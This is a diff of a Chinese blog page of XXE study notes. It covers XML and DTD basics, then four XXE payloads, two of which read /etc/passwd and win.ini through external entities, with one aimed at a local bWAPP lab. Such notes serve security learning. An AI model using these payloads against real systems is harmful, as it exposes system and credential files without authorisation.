@@ -7,7 +7,8 @@
     <meta name="keywords" content="XXE笔记, 书鱼">
     <meta name="description" content="XML的小知识
 1，元素元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。实例:
-12&amp;lt;body&amp;gt;body text in between&amp;lt;/body&amp;gt;&amp;lt;message&amp;g">
+&amp;lt;body&gt;body text in between&amp;lt;/body&gt;
+&amp;lt;message&gt;some mes">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -385,7 +386,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    419
+                    384
                 </div>
                 
 
@@ -410,25 +411,39 @@
             <div id="articleContent">
                 <h3 id="XML的小知识"><a href="#XML的小知识" class="headerlink" title="XML的小知识"></a>XML的小知识</h3><p><img src="1.png" alt=""></p>
 <h4 id="1，元素"><a href="#1，元素" class="headerlink" title="1，元素"></a>1，元素</h4><p>元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。<br>实例:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>body text in between<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>some message in between<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>body text in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>some message in between<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span></code></pre>
 <a id="more"></a>
 
 <p>空的 HTML 元素的例子是 “hr”、”br” 以及 “img”。</p>
 <h4 id="2，属性"><a href="#2，属性" class="headerlink" title="2，属性"></a>2，属性</h4><p>属性可提供有关元素的额外信息<br>实例：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"computer.gif"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>computer.gif<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre>
 <h4 id="3，实体"><a href="#3，实体" class="headerlink" title="3，实体"></a>3，实体</h4><p>实体是用来定义普通文本的变量。实体引用是对实体的引用。</p>
 <h4 id="4，PCDATA"><a href="#4，PCDATA" class="headerlink" title="4，PCDATA"></a>4，PCDATA</h4><p>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p>
 <h4 id="5，CDATA"><a href="#5，CDATA" class="headerlink" title="5，CDATA"></a>5，CDATA</h4><p>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。</p>
 <h4 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h4><p>DTD实体<br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
 <p>实体又分为一般实体和参数实体<br>1，一般实体的声明语法:<!ENTITY 实体名 "实体内容“><br>引用实体的方式：&amp;实体名；<br>2，参数实体只能在DTD中使用，参数实体的声明格式： <!ENTITY % 实体名 "实体内容“><br>引用实体的方式：%实体名；</p>
 <h3 id="payLoad"><a href="#payLoad" class="headerlink" title="payLoad"></a>payLoad</h3><p>payload1:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe "Thinking"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY ></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">xxe</span> <span class="token attr-name">"Thinking"</span><span class="token punctuation">></span></span>]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span></code></pre>
 <p>payload2:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "http://127.0.0.1/bWAPP/robots.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
+<span class="token doctype">&lt;!DOCTYPE note[
+&lt;!ENTITY xxe SYSTEM "http://127.0.0.1/bWAPP/robots.txt"></span>
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>reset</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>login</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>login</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>secret</span><span class="token punctuation">></span></span>Any bugs?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>secret</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>reset</span><span class="token punctuation">></span></span></code></pre>
 <p>payload3 Linux:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">      &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aaa</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">aaa</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
+<span class="token doctype">&lt;!DOCTYPE a [
+      &lt;!ENTITY b SYSTEM "file:///etc/passwd"></span>
+]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>aaa</span><span class="token punctuation">></span></span><span class="token entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>aaa</span><span class="token punctuation">></span></span></code></pre>
 <p>payload4 windows:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY  xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY ></span>
+&lt;!ENTITY  xxe SYSTEM "file:///c:/windows/win.ini" >]>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span></code></pre>
+
             </div>
             <hr/>
 
@@ -551,7 +566,8 @@
                         
                             环境配置github地址：https://github.com/c0ny1/upload-labs直接跑docker就完事了
 创建镜像
-12$ cd upload-labs/docker$ docker build -t upload-la
+$ cd upload-labs/docker
+$ docker build -t upload-lab
                         
                     </div>
                     <div class="publish-info">
@@ -810,7 +826,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">175.5k</span>&nbsp;字
+                class="white-color">173.5k</span>&nbsp;字
             
             
             
